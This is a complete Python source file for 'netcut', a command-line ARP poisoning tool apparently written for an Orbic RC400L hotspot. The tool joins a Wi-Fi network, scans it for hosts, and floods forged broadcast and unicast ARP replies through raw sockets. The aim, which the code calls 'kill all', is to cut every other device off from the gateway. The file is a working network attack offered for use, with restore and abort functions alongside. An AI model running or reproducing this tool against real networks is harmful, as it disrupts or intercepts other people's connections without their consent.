#!/usr/bin/env python3
"""
netcut — ARP poisoning attack tool for Orbic RC400L
Uses raw AF_PACKET sockets for maximum packet rate.
No scapy dependency.

Usage:
  netcut attack [ssid psk]   Join network (or use boot state), scan, kill all
  netcut scan  [ssid psk]    Join and scan only, no attack
  netcut stop                Restore ARP tables
  netcut status              Show connection and attack state
"""

import socket
import struct
import signal
import sys
import os
import json
import time
import subprocess
import threading

IFACE = os.environ.get("NETCUT_IFACE", "wlan0")
STATE_FILE = "/data/rayhunter/netctl_state.json"
LIVE_STATS = "/tmp/netcut_live.json"

BROADCAST = b'\xff\xff\xff\xff\xff\xff'

# Input event constants (struct input_event: sec, usec, type, code, value)
INPUT_EVENT_SIZE = 16
EV_KEY = 1
KEY_POWER = 116


def button_abort_monitor(stop_callback):
    """Watch for power button press to abort attack."""
    # Try powerkey first, fall back to qpnp_pon
    for dev_path in ['/dev/input/event2', '/dev/input/event0']:
        try:
            fd = os.open(dev_path, os.O_RDONLY | os.O_NONBLOCK)
            os.close(fd)
            break
        except OSError:
            dev_path = None

    if not dev_path:
        return

    try:
        with open(dev_path, 'rb') as f:
            while True:
                data = f.read(INPUT_EVENT_SIZE)
                if not data or len(data) < INPUT_EVENT_SIZE:
                    time.sleep(0.1)
                    continue
                _, _, ev_type, ev_code, ev_value = struct.unpack('IIHHi', data)
                if ev_type == EV_KEY and ev_code == KEY_POWER and ev_value == 1:
                    print("\n[!] ABORT — Power button pressed")
                    stop_callback()
                    return
    except (IOError, OSError):
        pass


def mac_bytes(s):
    return bytes(int(b, 16) for b in s.split(':'))


def ip_bytes(s):
    return socket.inet_aton(s)


def arp_reply(eth_dst, eth_src, sender_mac, sender_ip, target_mac, target_ip):
    eth = struct.pack('!6s6sH', eth_dst, eth_src, 0x0806)
    arp = struct.pack('!HHBBH6s4s6s4s',
                      1, 0x0800, 6, 4, 2,
                      sender_mac, sender_ip,
                      target_mac, target_ip)
    return eth + arp


def load_state():
    if not os.path.exists(STATE_FILE):
        return None
    with open(STATE_FILE) as f:
        return json.load(f)


def save_state(state):
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f)


def netctl(cmd, *args):
    script = None
    for path in ["/data/rayhunter/netctl.sh",
                 "/host/data/rayhunter/netctl.sh"]:
        if os.path.exists(path):
            script = path
            break
    if not script:
        return {"ok": False, "error": "netctl.sh not found"}

    linker = "/host/lib/ld-linux.so.3"
    busybox = "/host/bin/busybox"
    if os.path.exists(linker) and os.path.exists(busybox):
        full = [linker, "--library-path", "/host/lib:/host/usr/lib",
                busybox, "sh", script, cmd] + list(args)
    else:
        full = ["/bin/sh", script, cmd] + list(args)

    r = subprocess.run(full, capture_output=True, text=True, timeout=90)
    out = r.stdout.strip()
    if out:
        for line in reversed(out.split('\n')):
            line = line.strip()
            if line.startswith('{'):
                try:
                    return json.loads(line)
                except json.JSONDecodeError:
                    continue
    return {"ok": False, "error": r.stderr.strip() or "no JSON output"}


def do_join(ssid, psk):
    print(f"[*] Joining {ssid}...")
    result = netctl("join", ssid, psk)
    if not result.get("ok"):
        print(f"[-] Join failed: {result.get('error', 'unknown')}")
        sys.exit(1)
    print(f"[+] Connected: IP={result['ip']} GW={result['gateway']} ({result['gateway_mac']})")
    return result


def write_live(status, **kw):
    try:
        with open(LIVE_STATS, 'w') as f:
            f.write(json.dumps({"status": status, **kw}))
    except OSError:
        pass


def do_scan():
    write_live("SCANNING")
    print("[*] Scanning network...")
    result = netctl("scan")
    if not result.get("ok"):
        print(f"[-] Scan failed: {result.get('error', 'unknown')}")
        sys.exit(1)
    hosts = result.get("hosts", [])
    print(f"[+] Found {len(hosts)} hosts:")
    state = load_state()
    gw = state["gateway"] if state else ""
    for h in hosts:
        label = " (GATEWAY)" if h["ip"] == gw else ""
        print(f"    {h['ip']:16s} {h['mac']}{label}")
    return hosts


def build_packets(my_mac, gw_ip, gw_mac, targets):
    m = mac_bytes(my_mac)
    gi = ip_bytes(gw_ip)
    gm = mac_bytes(gw_mac)

    pkts = []

    # Broadcast: "gateway is at my MAC" — poisons every device at once
    pkts.append(arp_reply(BROADCAST, m, m, gi, BROADCAST, b'\x00\x00\x00\x00'))

    for t in targets:
        tm = mac_bytes(t['mac'])
        ti = ip_bytes(t['ip'])
        # Unicast to target: "gateway is at my MAC"
        pkts.append(arp_reply(tm, m, m, gi, tm, ti))
        # Unicast to gateway: "target is at my MAC"
        pkts.append(arp_reply(gm, m, m, ti, gm, gi))

    return pkts


def build_restore_packets(gw_ip, gw_mac, targets):
    gm = mac_bytes(gw_mac)
    gi = ip_bytes(gw_ip)

    pkts = []
    for t in targets:
        tm = mac_bytes(t['mac'])
        ti = ip_bytes(t['ip'])
        # Tell target the real gateway MAC
        pkts.append(arp_reply(tm, gm, gm, gi, tm, ti))
        # Tell gateway the real target MAC
        pkts.append(arp_reply(gm, tm, tm, ti, gm, gi))

    # Broadcast correct gateway
    pkts.append(arp_reply(BROADCAST, gm, gm, gi, BROADCAST, b'\x00\x00\x00\x00'))

    return pkts


def attack(state, targets):
    my_mac = state["my_mac"]
    gw_ip = state["gateway"]
    gw_mac = state["gateway_mac"]
    my_ip = state["ip"]

    kill_targets = [t for t in targets if t["ip"] != my_ip and t["ip"] != gw_ip]

    if not kill_targets:
        print("[-] No targets to attack")
        return

    if not gw_mac:
        print("[-] No gateway MAC — can't attack")
        return

    pkts = build_packets(my_mac, gw_ip, gw_mac, kill_targets)
    restore_pkts = build_restore_packets(gw_ip, gw_mac, kill_targets)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((IFACE, 0))

    print(f"[*] ATTACKING {len(kill_targets)} targets ({len(pkts)} pkts/cycle)")
    print(f"    Broadcast + {len(kill_targets)} unicast-to-target + {len(kill_targets)} unicast-to-gateway")
    print(f"    Press Ctrl+C to stop and restore")

    running = True
    count = 0
    t_start = time.monotonic()

    def stop_handler(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    # Start button abort monitor in background thread
    btn_thread = threading.Thread(
        target=button_abort_monitor,
        args=(lambda: stop_handler(None, None),),
        daemon=True
    )
    btn_thread.start()

    try:
        last_stats = 0
        while running:
            for p in pkts:
                sock.send(p)
                count += 1

            elapsed = time.monotonic() - t_start
            now = int(elapsed)
            if now % 5 == 0 and elapsed > 0:
                rate = count / elapsed
                sys.stderr.write(f"\r[*] {count} pkts sent | {rate:.0f} pkt/s | {elapsed:.0f}s")
                sys.stderr.flush()

            if now != last_stats and now % 2 == 0:
                last_stats = now
                rate = count / elapsed if elapsed > 0 else 0
                try:
                    with open(LIVE_STATS, 'w') as sf:
                        sf.write(json.dumps({
                            "status": "ATTACKING",
                            "targets": len(kill_targets),
                            "packets": count,
                            "pps": int(rate),
                            "elapsed": int(elapsed)
                        }))
                except OSError:
                    pass
    except OSError as e:
        print(f"\n[-] Socket error: {e}")

    elapsed = time.monotonic() - t_start
    rate = count / elapsed if elapsed > 0 else 0
    print(f"\n[*] Stopped. {count} packets in {elapsed:.1f}s ({rate:.0f} pkt/s)")

    print("[*] Restoring ARP tables...")
    for _ in range(5):
        for p in restore_pkts:
            sock.send(p)
        time.sleep(0.1)

    sock.close()
    print("[+] ARP tables restored. Done.")


def cmd_attack(args):
    if len(args) >= 2:
        do_join(args[0], args[1])

    state = load_state()
    if not state or not state.get("ok"):
        print("[-] Not connected. Provide SSID and PSK, or ensure boot connected.")
        sys.exit(1)

    targets = do_scan()
    if not targets:
        print("[-] No hosts found")
        sys.exit(1)

    state = load_state()
    attack(state, targets)


def cmd_scan(args):
    if len(args) >= 2:
        do_join(args[0], args[1])

    state = load_state()
    if not state or not state.get("ok"):
        print("[-] Not connected.")
        sys.exit(1)

    do_scan()


def cmd_stop(args):
    state = load_state()
    if not state or not state.get("ok"):
        print("[-] No state to restore")
        return

    print("[*] Sending ARP restore broadcast...")
    gw_mac = state.get("gateway_mac", "")
    gw_ip = state.get("gateway", "")
    if not gw_mac or not gw_ip:
        print("[-] Missing gateway info")
        return

    scan_result = netctl("scan")
    targets = scan_result.get("hosts", [])

    restore_pkts = build_restore_packets(gw_ip, gw_mac, targets)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((IFACE, 0))

    for _ in range(10):
        for p in restore_pkts:
            sock.send(p)
        time.sleep(0.1)

    sock.close()
    print(f"[+] Sent restore to {len(targets)} hosts")


def cmd_status(args):
    state = load_state()
    if not state:
        print("Not connected (no state file)")
        return
    print(f"  Interface:    {IFACE}")
    print(f"  Connected:    {state.get('ok', False)}")
    print(f"  SSID:         {state.get('ssid', 'N/A')}")
    print(f"  IP:           {state.get('ip', 'N/A')}")
    print(f"  Gateway:      {state.get('gateway', 'N/A')}")
    print(f"  Gateway MAC:  {state.get('gateway_mac', 'N/A')}")
    print(f"  My MAC:       {state.get('my_mac', 'N/A')}")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(0)

    cmd = sys.argv[1]
    args = sys.argv[2:]

    if cmd == "attack":
        cmd_attack(args)
    elif cmd == "scan":
        cmd_scan(args)
    elif cmd == "stop":
        cmd_stop(args)
    elif cmd == "status":
        cmd_status(args)
    else:
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
